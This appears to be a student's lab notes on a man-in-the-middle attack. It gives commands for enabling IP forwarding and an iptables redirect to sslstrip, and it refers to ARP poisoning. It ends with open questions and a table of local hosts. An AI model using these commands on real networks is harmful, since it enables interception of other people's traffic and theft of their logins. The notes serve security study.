##### forward traffic from one target to another (victim -> gateway)
We don't want to only sniff, but also route traffic  
enable IP forwarding by kernel:  
`sudo sysctl net.ipv4.ip_forward=1`   
`sysctl` is a tool for examining and changing kernel parameters at runtime  
OR  
`sudo su` (sudoers don't have such priviledges :O)  
`echo "1" > /proc/sys/net/ipv4/ip_forward`  

for change persistent after reboot edit `/etc/sysctl.d/30-ipforward.conf`  
e.g.  
```
net.ipv4.ip_forward=1
net.ipv6.conf.default.forwarding=1
net.ipv6.conf.all.forwarding=1
```


Configure iptables:  
`iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 9999`  
`sslstrip` will listen on 9999, thus working only on to-be-redirected HTTPs  
`iptables` run as `systemd` service. To start on reboot you have to `enable` it.   
rules to be loaded are located in `/etc/iptables/iptables.rules` for `iptables.service` and in `/etc/iptables/ip6tables.rules` for `ip6tables.service`    
to save rules passed via cli to conf file: `iptables-save -f /etc/iptables/iptables.rules`   
if conf file edited - `reload` via `systemctl`   

ARP poisoning like in [zad8](./zad8.md)  

`sslstrip -l 9999`  
what exactly it does?  




How during arp spoof sniff  neocortex is allowed to browse web? (kernel forwarding is not active)

```
192.168.1.1     f0:51:36:1f:17:96       TCT mobile ltd
192.168.1.100   28:f1:0e:21:14:8d       Dell Inc.
192.168.1.107   c4:85:08:d3:4a:00       Intel Corporate
192.168.1.102   92:d9:55:3b:80:51       (Unknown: locally administered)
```